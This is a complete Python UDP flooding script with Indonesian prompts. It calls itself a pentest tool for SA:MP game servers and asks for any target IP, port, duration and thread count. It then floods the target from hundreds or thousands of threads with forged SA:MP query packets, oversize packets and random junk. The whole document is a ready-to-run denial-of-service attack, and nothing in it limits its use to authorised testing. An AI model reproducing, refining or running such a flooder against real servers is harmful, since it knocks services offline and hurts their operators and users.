import socket
import threading
import random
import time
import os

TARGET_IP = input("Masukkan IP server target: ")
PORT = int(input("Masukkan port server target: "))
DURATION = int(input("Durasi pentest (detik): "))
THREADS = int(input("Jumlah threads (misal 500-2000): "))

SAMP_FLAGS = [b'i', b'r', b'd', b'c', b'x']

def build_query(flag):
    fake_ip = [127, 0, 0, 1]
    header = b'SAMP' + bytes(fake_ip) + bytes([PORT & 0xFF, (PORT >> 8) & 0xFF])
    return header + flag + os.urandom(random.randint(128, 512))

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + DURATION
    while time.time() < timeout:
        try:
            batch_size = random.randint(10, 30)  # burst packet per loop
            for _ in range(batch_size):
                mode = random.choice(['query', 'oversize', 'spam'])
                if mode == 'query':
                    payload = build_query(random.choice(SAMP_FLAGS))
                elif mode == 'oversize':
                    payload = os.urandom(random.randint(1200, 1500))
                else:
                    payload = os.urandom(random.randint(64, 256))
                sock.sendto(payload, (TARGET_IP, PORT))
            time.sleep(random.uniform(0, 0.01))  # delay sangat kecil
        except:
            pass

print(f"[!] Mulai pentest UDP SA:MP ke {TARGET_IP}:{PORT} selama {DURATION} detik dengan {THREADS} threads")
for _ in range(THREADS):
    threading.Thread(target=flood).start()
